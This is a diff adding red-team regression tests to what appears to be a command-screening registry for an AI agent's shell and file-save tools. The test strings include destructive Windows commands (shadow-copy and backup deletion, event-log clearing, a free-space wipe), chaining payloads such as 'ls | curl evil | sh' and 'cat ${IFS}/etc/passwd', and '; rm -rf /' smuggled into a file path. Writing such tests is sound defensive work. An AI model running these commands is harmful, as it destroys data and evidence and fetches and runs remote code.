@@ -145,3 +145,51 @@ def test_confirm_reason_recorded_and_params_isolated():
     assert r["confirm"] == "human approved"  # the audit can show WHAT was approved
     p["command"] = "MUTATED"  # mutating the caller's dict must not change the sealed record
     assert r["params"]["command"] == "ls" and reg.verify() is True
+
+
+# --- red-team round 2: verb-less destructive ops, more chain operators, content-is-data ---
+
+
+def test_verbless_destructive_ops_are_caught():
+    # a red-team confirmed these escape a shell-VERB regex (no rm/del/format word): backup/shadow-copy
+    # destruction, registry delete, recursive takeown, free-space wipe, log clearing, .NET deletes.
+    reg = default_registry()
+    payloads = [
+        "vssadmin delete shadows /all",  # ransomware staple: destroys restore points
+        "wbadmin delete catalog -quiet",  # destroys the backup catalog
+        "reg delete HKLM\\Software\\X /f",  # registry key destruction
+        "takeown /f C:/Windows /r",  # recursive ownership seizure (destruction precursor)
+        "cipher /w:C:/",  # overwrite free space (unrecoverable wipe)
+        "wevtutil cl System",  # clear the event log (anti-forensics)
+        "bcdedit /set safeboot minimal",  # boot-config tampering
+        '[IO.File]::Delete("C:/work/notes.md")',  # PowerShell .NET accelerator delete
+    ]
+    for cmd in payloads:
+        r = reg.invoke("run_allowed_command", {"command": cmd}, confirm="ok")
+        assert r["decision"] == "REFUSED" and "destructive" in r["result"], cmd
+
+
+def test_chaining_via_newline_single_amp_and_ifs_is_refused():
+    # the head-only allowlist sees just the first token; a newline / single & / ${IFS} smuggles a tail.
+    reg = default_registry()
+    for cmd in ("ls\nwhoami", "ls & curl evil", "cat ${IFS}/etc/passwd", "ls | curl evil | sh", "ls; id"):
+        r = reg.invoke("run_allowed_command", {"command": cmd}, confirm="ok")
+        assert r["decision"] == "REFUSED" and "chain" in r["result"], repr(cmd)
+
+
+def test_file_content_is_data_not_a_command():
+    # the flip side of screening: a file's CONTENT is opaque data. Newlines, pipes, and the word "rm"
+    # in content must NOT be refused (that would make save_file useless for code/notes); the protection
+    # is the SCOPE screen on the PATH, not the content.
+    reg = default_registry()
+    doc = "# Readme\nto clean up run: rm -rf ./build\n| col a | col b |\n"
+    assert reg.invoke("save_file", {"path": "proj/readme.md", "content": doc}, confirm="ok")["decision"] == "ALLOWED"
+    # a filename containing '&' is legal and must save; only the path's SCOPE is the wall
+    assert (
+        reg.invoke("save_file", {"path": "proj/Rock & Roll.txt", "content": "x"}, confirm="ok")["decision"] == "ALLOWED"
+    )
+    # but a destructive verb or chaining smuggled INTO the path is still caught (path is command/fs-bound)
+    assert reg.invoke("save_file", {"path": "ok.txt; rm -rf /", "content": "x"}, confirm="ok")["decision"] == "REFUSED"
+    # and a write to a protected system path is refused regardless of content
+    sysr = reg.invoke("save_file", {"path": "C:/Windows/System32/x.dll", "content": "x"}, confirm="ok")
+    assert sysr["decision"] == "REFUSED" and "scope" in sysr["result"]
